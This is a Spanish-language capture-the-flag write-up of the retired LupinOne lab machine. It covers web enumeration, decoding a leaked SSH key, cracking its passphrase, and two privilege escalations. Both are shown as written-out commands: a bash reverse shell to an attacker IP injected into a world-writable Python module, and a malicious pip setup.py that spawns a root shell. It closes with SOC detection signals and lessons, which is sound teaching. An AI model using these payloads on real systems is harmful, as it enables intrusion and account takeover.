# LupinOne

| Campo | Valor |
|---|---|
| **Plataforma** | Empresa · LupinOne (reto del «gentleman thief») |
| **Sistema** | Debian 11 · Apache 2.4.41 · OpenSSH 8.2p1 |
| **Dificultad** | media |
| **Fecha** | 2026-10-27 |
| **Tiempo** | ~40 minutos |

- **Técnicas:** T1595.002 · T1046 · T1083 · T1552.004 · T1110.002 · T1078 · T1548.003 · T1574 · T1059.006
- **Flag de root:** `3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}`

> Es una máquina de práctica ya retirada. Las credenciales se sustituyen por el procedimiento que
> las obtiene: quien quiera reproducirla llega a ellas con los mismos pasos.

## Resumen

La web esconde un directorio `secret` con un mensaje firmado por un usuario y un fichero cifrado en
Base58. El secreto está en un directorio `~secret` que aparece al enumerar con `ffuf`, y dentro un
fichero oculto `.mysecret.txt`: al decodificarlo sale una **clave privada SSH** cuya passphrase cae con `fasttrack`. Con esa
cuenta, `sudo` permite ejecutar un script de Python de otro usuario; el módulo `webbrowser` del
sistema es **escribible por cualquiera**, así que se inyecta una reverse shell y se pasa a `arsene`.
Él puede ejecutar `pip` como root: un paquete con `setup.py` malicioso cierra la escalada.

Es una cadena de **dos usuarios y ningún exploit**: `icex64`, luego `arsene`, luego root: permisos mal puestos y
una clave privada publicada «para que no la encuentren».

## Reconocimiento

Barrido de la red para localizar la máquina y escaneo completo de servicios:

```bash
sudo arp-scan -l
nmap -sC -sV -p- <IP-objetivo>
```

Dos únicos servicios: **22/tcp** (OpenSSH 8.2p1) y **80/tcp** (Apache 2.4.41). El escaneo con
scripts no da título ni contenido interesante, pero deja `robots.txt` en la lista.

![Escaneo de puertos: solo SSH y HTTP](evidencia/nmap.png)

## El secreto: dos enumeraciones

La web está tematizada con Arsène Lupin. El escaneo con scripts deja un directorio `~myfiles` que
parece la pista, pero al abrirlo da **404**: el autor dejó un señuelo.

El camino real es una ruta con forma de directorio de usuario de Apache (`~nombre`), y para eso hay
que enumerar con un patrón concreto:

```bash
sudo ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -u 'http://<IP-objetivo>/~FUZZ'
```

Aparece **`secret`** con un `301`: el directorio es **`/~secret/`**.

![Primera enumeración: aparece ~secret con un 301](evidencia/ffuf-directorios.png)

Dentro hay un mensaje que lo pone en bandeja: comparte su clave privada SSH y avisa de que la
passphrase se puede crackear con **fasttrack**.

![El mensaje de /~secret/: comparte su clave y avisa de la passphrase](evidencia/secret-mensaje.png)

Dice que el fichero está escondido «en algún sitio de aquí». Es literal: es un fichero **oculto**,
con punto delante, así que la segunda enumeración busca dotfiles dentro del directorio y añade las
extensiones:

```bash
sudo ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -u 'http://<IP-objetivo>/~secret/.FUZZ' -fc 403 -e .txt,.html
```

Encuentra **`.mysecret.txt`** con un `200` y 6.689 bytes.

![Segunda enumeración: el fichero oculto .mysecret.txt](evidencia/ffuf-fichero-oculto.png)

Se abre el fichero antes de tocar ninguna herramienta de descifrado:

```bash
curl http://<IP-objetivo>/~secret/.mysecret.txt
```

Contiene un bloque de texto largo que no es base64 ni nada legible:

![El contenido de .mysecret.txt](evidencia/mysecret-txt.png)

Con el contenido ya en la mano, se identifica: un identificador de cifrados lo resuelve como
**Base 58**, y la decodificación devuelve una clave privada OpenSSH completa:

![Decodificación Base58: aparece la clave privada](evidencia/base58-decode.png)

## De la clave al usuario

La clave está protegida con passphrase. Se convierte al formato de john y se ataca con la lista `fasttrack`
que trae Kali:

```bash
sudo /usr/bin/ssh2john sshkey > ssh2john
sudo john --wordlist=/usr/share/wordlists/fasttrack.txt ssh2john
```

La passphrase sale de la lista en segundos: era `lupin`, el nombre de la propia máquina, la
pista que el autor dejó escrita en el mensaje del directorio secreto.

![john contra la passphrase de la clave](evidencia/john-passphrase.png)

```bash
sudo ssh -i sshkey icex64@<IP-objetivo>
```

![Sesión SSH como icex64](evidencia/ssh-icex64.png)

## De icex64 a arsene

Primera comprobación de siempre:

```bash
sudo -l
# User icex64 may run the following commands on LupinOne:
#     (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
```

![sudo -l: puede ejecutar el script de arsene como arsene](evidencia/sudo-l-icex64.png)

El script abre un navegador con la librería `webbrowser`. Y ahí está el fallo: el módulo del sistema
es **escribible por cualquiera**.

```bash
find / -type f -perm 777 2>/dev/null
# /usr/lib/python3.9/webbrowser.py
```

![El módulo webbrowser es world-writable](evidencia/permisos-777.png)

Se edita para que, al importarlo, devuelva una shell al atacante:

```python
os.system("/bin/bash -c '/bin/bash -i >& /dev/tcp/<IP-atacante>/1234 0>&1'")
```

![Inyección en webbrowser.py](evidencia/inyeccion-webbrowser.png)

Se escucha en el puerto elegido y se lanza el script con los permisos de `arsene`:

```bash
nc -lvp 1234
sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
```

![Shell como arsene](evidencia/shell-arsene.png)

## De arsene a root

Otra vez `sudo -l`, ahora con la cuenta nueva:

```bash
sudo -l
# User arsene may run the following commands on LupinOne:
#     (root) NOPASSWD: /usr/bin/pip
```

![arsene puede ejecutar pip como root](evidencia/sudo-l-arsene.png)

`pip` es uno de los binarios clásicos de GTFOBins: instala un paquete y ejecuta su `setup.py` como
el usuario que lanza la orden. Un paquete vacío con una línea de código basta:

```bash
TF=$(mktemp -d)
echo "import os; os.system('sh </dev/tty >/dev/tty 2>/dev/tty')" > $TF/setup.py
sudo pip install $TF
```

![Paquete con setup.py malicioso instalado con sudo](evidencia/pip-setup.png)

```bash
# whoami
root
cd /root && ls && cat root.txt
```

![Flag de root](evidencia/root-flag.png)

## Qué vería un SOC

| Señal | Dónde se ve | Regla mínima |
|---|---|---|
| Enumeración de directorios con `ffuf` en segundos | Log de Apache: cientos de 404 desde una IP | ≥ 50 404/min desde una IP → alerta nivel 8 |
| Descarga de `secret.txt` y de la clave | Log de Apache con `200` sobre `/secret/` | Acceso a rutas con «secret/key/backup» → nivel 10 |
| Fuerza bruta de passphrase (offline) | No se ve en red | Detectable solo por integridad: nueva clave privada en el home |
| `sudo -u arsene python3.9 …` | `auth.log` / audit | Ejecución de intérpretes con `sudo` → nivel 9 |
| Módulo del sistema modificado | Integridad de ficheros (FIM) | Cambio en `/usr/lib/python3*/` → nivel 12 |
| `pip install` como root | Log de proceso + FIM | `pip install` con `sudo` fuera de mantenimiento → nivel 10 |

La cadena entera es invisible para un SOC que solo mira tráfico: el único momento ruidoso es la
enumeración web. Los otros dos saltos se detectan por **integridad** y por **auditoría de sudo**, no
por red.

## Lecciones

- **Una clave privada no se comparte, ni «escondida»**: publicada en una ruta adivinable y con un
  cifrado que se identifica en un minuto, es una cuenta regalada.
- **`777` en un módulo del sistema es una puerta trasera involuntaria**: cualquier proceso que lo
  importe ejecuta lo que otro haya escrito.
- **`sudo` sobre `pip` (o cualquier gestor de paquetes) equivale a `sudo` sobre el intérprete**: si
  puede instalar, puede ejecutar.
- **Dos usuarios no hacen una máquina difícil, hacen una máquina mal configurada**: ninguna de las
  dos elevaciones usó un exploit, solo permisos y una contraseña de lista.
